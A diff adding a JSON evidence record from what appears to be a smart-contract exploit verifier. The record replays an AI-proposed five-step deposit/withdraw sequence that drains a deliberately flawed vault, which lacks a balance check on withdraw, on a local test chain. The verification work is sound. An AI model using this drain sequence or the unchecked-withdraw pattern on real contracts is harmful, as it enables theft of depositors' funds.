@@ -1,0 +1,105 @@
+{
+  "schemaVersion": 1,
+  "sourceEvidence": "crates/verifier/evidence/ai/reasoning-5000-2026-11-06.json",
+  "completionId": "a278f01331794ed68e741098f34aaff9",
+  "candidate": {
+    "rule": "R2",
+    "rationale": "VaultV2Drain's stage-3 loyalty rebate withdraw zeroes the caller's recorded balance and decrements totalDeposits by that balance, but transfers the requested `amount` with no balance check — so with a victim's deposit backing the vault, a stage-3 withdraw with amount > recorded balance pays out tokens not covered by totalDeposits, leaving totalDeposits() > token.balanceOf(proxy).",
+    "steps": [
+      {
+        "from": "victim",
+        "call": "deposit(uint256)",
+        "args": [
+          "1000000000000000000"
+        ],
+        "value": "0"
+      },
+      {
+        "from": "attacker",
+        "call": "deposit(uint256)",
+        "args": [
+          "1"
+        ],
+        "value": "0"
+      },
+      {
+        "from": "attacker",
+        "call": "withdraw(uint256)",
+        "args": [
+          "1"
+        ],
+        "value": "0"
+      },
+      {
+        "from": "attacker",
+        "call": "deposit(uint256)",
+        "args": [
+          "1"
+        ],
+        "value": "0"
+      },
+      {
+        "from": "attacker",
+        "call": "withdraw(uint256)",
+        "args": [
+          "1000000000000000001"
+        ],
+        "value": "0"
+      }
+    ]
+  },
+  "candidateUnmodified": true,
+  "candidateSha256": "2ad37f645109d678600222f4d168792811dc55d8c14f81e52f675a4cfaf2378e",
+  "actor": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
+  "victim": "0x0000000000000000000000000000000000000002",
+  "prestate": {
+    "seedDepositor": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+    "seedDepositUnits": "100",
+    "attackerTokensAndApprovalUnits": "10",
+    "victimTokensAndApprovalUnitsWhenFunded": "1000000000000000000",
+    "candidateInitializationCapUnits": "1000000000000000000000"
+  },
+  "cases": [
+    {
+      "implementation": "drain",
+      "victimFundedAndApproved": false,
+      "reproduced": false,
+      "evidenceBlock": 10,
+      "evidenceBlockHash": "0xd455ce60c83c879ad5a83fda88f122ee41e31fad35b3ed389f92b52dea71a8f5",
+      "elapsedMs": 339
+    },
+    {
+      "implementation": "honest",
+      "victimFundedAndApproved": false,
+      "reproduced": false,
+      "evidenceBlock": 10,
+      "evidenceBlockHash": "0xd455ce60c83c879ad5a83fda88f122ee41e31fad35b3ed389f92b52dea71a8f5",
+      "elapsedMs": 310
+    },
+    {
+      "implementation": "drain",
+      "victimFundedAndApproved": true,
+      "reproduced": true,
+      "evidenceBlock": 14,
+      "evidenceBlockHash": "0x66aa27facdd1ee699aae8344b753bbc832321d28f4d3d6eeb657b7c616b143b9",
+      "elapsedMs": 462
+    },
+    {
+      "implementation": "honest",
+      "victimFundedAndApproved": true,
+      "reproduced": false,
+      "evidenceBlock": 14,
+      "evidenceBlockHash": "0x66aa27facdd1ee699aae8344b753bbc832321d28f4d3d6eeb657b7c616b143b9",
+      "elapsedMs": 424
+    }
+  ],
+  "network": "local Anvil only; authenticated prestateTracer/eth_getProof and production revm replay",
+  "newPaidInferenceRequests": 0,
+  "certificateIssued": false,
+  "limits": [
+    "Local synthetic prestate, not the original AI prompt's chain state or a testnet witness.",
+    "The victim funding, approval and sufficient V2 cap are explicit prerequisites, not changes to candidate steps.",
+    "Four production replays: funded/unfunded victim against drain/honest; no general find rate or full verifier certification."
+  ],
+  "observedAt": "2026-11-06T11:12:08.466Z"
+}
